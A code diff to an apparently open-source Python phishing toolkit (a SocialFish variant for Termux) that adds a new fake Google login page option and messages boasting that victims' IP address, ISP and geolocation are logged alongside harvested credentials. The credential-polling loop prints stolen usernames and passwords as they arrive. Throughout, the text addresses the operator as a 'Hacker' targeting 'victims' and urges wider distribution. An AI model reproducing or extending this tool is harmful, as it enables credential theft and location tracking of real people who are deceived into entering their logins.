@@ -86,7 +86,9 @@ def runPhishing(social, option2):
     elif option2 == '1' and social == 'Google':
         system('cp WebPagesTermux/google_standard/*.* ServerTermux/www/')
     elif option2 == '2' and social == 'Google':
-        system('cp WebPagesTermux/google_advanced_poll/*.* ServerTermux/www/')   
+        system('cp WebPagesTermux/google_advanced_poll/*.* ServerTermux/www/')
+    elif option2 == '3' and social == 'Google':
+        system('cp WebPagesTermux/google_advanced_web/*.* ServerTermux/www/')	
     elif social == 'LinkedIn':
         system('cp WebPagesTermux/linkedin/*.* ServerTermux/www/')
     elif social == 'GitHub':
@@ -106,23 +108,26 @@ def runPhishing(social, option2):
         
 def waitCreds():
     print " {0}[{1}*{0}]{1} Hi Hacker Everything has been completed.............. Start HAcking ".format(RED, END) 
-    print " {0}[{1}*{0}]{1} I HAVE A TIP FOR YOU".format(GREEN, END) 
+  
     print '''{0}
    _.-=-._     .-, 
  .'       "-.,' / 
 (  AnonUD4Y_  ~.< 
- `=.____.="  `._\\
- [{1}*{0}]{1} Do you need more help to make your ngrok link more trusted. 
- [{1}*{0}]{1} Just visit to [https://iplogger.org]
- [{1}*{0}]{1} This will help you to trace your victims by their ip address on real time. 
- [{1}*{0}]{1} And make your ngrok link more trusted type.{0}'''.format(CYAN, END)
-    print " {0}[{1}*{0}]{1} Waiting for credentials... \n".format(GREEN, END)
+ `=.____.="  `._\\ 
+ 
+ [{1}*{0}]{1} NOW YOU WILL GET YOUR VICTIM'S LIVE INFORMATION  
+ [{1}*{0}]{1} JUST GOTO YOUR [ SocialFish/server/www/iplog.txt ]
+ [{1}*{0}]{1} GET VICTIM'S IP ADDRESS, ISP, GEOLOCATION, AND MANY MORE STUFF.{0}'''.format(CYAN, END)
+   
+    print " {0}[{1}*{0}]{1} Waiting for credentials & victim's info... \n".format(RED, END)
     while True:
         with open('ServerTermux/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
             print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
             system('rm -rf ServerTermux/www/usernames.txt && touch ServerTermux/www/usernames.txt')
+	    print ' {0}VICTIM INFORMATION AVAILABLE IN [ server/www/iplog.txt ]{1}\n {0}{1}'.format(RED, END)
+            print ' {0}HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE AVILABLE TO ALL PEOPLE {1}\n {0}{1}'.format(RED, END)	
         creds.close()
 
 def runPEnv():
@@ -170,7 +175,7 @@ def runPEnv():
         runPhishing('Facebook', option2)
     elif option == '2':
         loadModule('Google')
-        option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
+        option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
         runPhishing('Google', option2)
     elif option == '3':
         loadModule('LinkedIn')
